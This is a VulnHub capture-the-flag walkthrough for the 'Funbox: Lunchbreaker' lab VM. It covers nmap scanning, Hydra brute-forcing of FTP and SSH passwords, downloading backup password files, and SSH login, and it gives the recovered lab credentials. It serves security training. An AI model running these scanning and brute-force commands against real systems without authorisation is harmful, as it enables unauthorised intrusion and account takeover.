# Funbox: Lunchbreaker

- **Machine:** Funbox: Lunchbreaker
- **Download:** https://www.vulnhub.com/entry/funbox-lunchbreaker,700/

![](832-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](832-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.240
```

![](832-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.240
```

```bash
nmap -sC -sV -A 192.168.2.240
```

---

## HTTP Enumeration

This command performs an aggressive scan and runs the `http-enum` NSE script to identify interesting web directories.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.240
```

![](832-4.png)

---

# Web Enumeration

Visit the following URLs:

- http://192.168.2.240
- http://192.168.2.240/robots.txt

---

## Inspect the Source Code

View the page source and look for hidden information.

![](832-5.png)

### Clue Found

```text
webdesign by j.miller [jane@funbox8.ctf]
```

---

## Brute Force the FTP Password (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

Use Hydra to identify Jane's FTP password.

```bash
hydra -V -l jane -P /opt/rockyou.txt 192.168.2.240 ftp
```

![](832-6.png)

### Credentials

```text
Username : jane
Password : password
```

---

# FTP Enumeration

## Login to the FTP Server

```bash
ftp 192.168.2.240
```

![](832-7.png)

List all files.

```bash
ls -la
```

Download the interesting files.

```bash
get .s3cr3t
```

```bash
get supers3cr3t
```

![](832-8.png)

---

## Review the Files

```bash
cat .s3cr3t
```

```bash
cat supers3cr3t
```

![](832-9.png)

The `supers3cr3t` file appears to contain Brainfuck-encoded data.

Decode the Base64 content.

```bash
cat .s3cr3t | base64 -d
```

![](832-10.png)

---

## Download the WordPress Backup

Mirror the WordPress directory from the FTP server.

```bash
wget -m ftp://anonymous:anonymous@192.168.2.240/wordpress/
```

![](832-11.png)

---

## Enumerate Jane's FTP Account

Login again using Jane's credentials.

```bash
ftp 192.168.2.240
```

List the available files.

```bash
ls
```

Navigate to the backup directory.

```bash
cd backups
```

```bash
ls
```

Download the key file.

```bash
get keys.txt
```

![](832-12.png)

Read the file.

```bash
cat keys.txt
```

![](832-13.png)

---

## Enumerate User Accounts

Navigate to the home directory.

```bash
cd /home
```

List hidden files.

```bash
ls -la
```

![](832-14.png)

---

## Brute Force Jim's FTP Password

```bash
hydra -V -l jim -P /opt/rockyou.txt 192.168.2.240 ftp
```

![](832-15.png)

### Credentials

```text
Username : jim
Password : 12345
```

> **Note:** Logging into Jim's FTP account did not reveal any useful files.

---

## Brute Force Jules' FTP Password

```bash
hydra -l jules -P /opt/rockyou.txt ftp://192.168.2.240
```

![](832-16.png)

### Credentials

```text
Username : jules
Password : sexylady
```

---

## Enumerate Jules' FTP Account

Login using Jules' credentials.

```bash
ftp 192.168.2.240
```

List the files.

```bash
ls -la
```

Navigate to the hidden backup directory.

```bash
cd .backups
```

```bash
ls -la
```

Download the password files.

```bash
get .bad-passwds
```

```bash
get .good-passwd
```

![](832-17.png)

![](832-18.png)

---

# SSH Access

Use the recovered password list to brute-force John's SSH password.

```bash
hydra -l john -P .bad-passwds ssh://192.168.2.240
```

![](832-19.png)

---

## Login via SSH

```bash
ssh john@192.168.2.240
```

### Credentials

```text
Username : john
Password : zhnmju!!!
```

![](832-20.png)

Successful authentication provides shell access.

---

# Impact

- Information disclosure through website source code.
- Weak FTP credentials allowed unauthorized access.
- Multiple FTP accounts exposed sensitive backup files.
- Password lists enabled credential reuse attacks.
- SSH credentials were successfully recovered, resulting in initial system access.

---

# Key Learning

- Always inspect HTML source code for hidden clues.
- Enumerate every accessible FTP account after obtaining credentials.
- Backup directories frequently contain sensitive information.
- Password reuse across multiple services significantly increases risk.
- Information gathered from one service can often be leveraged to compromise another.

---

# Summary

The assessment began with web enumeration, where a clue in the HTML source identified a potential username. Weak FTP credentials were recovered through password guessing, allowing access to multiple user accounts. Further FTP enumeration exposed backup files containing password lists, which were then used to recover valid SSH credentials. Using the recovered credentials, SSH authentication was successfully performed, providing initial access to the target system.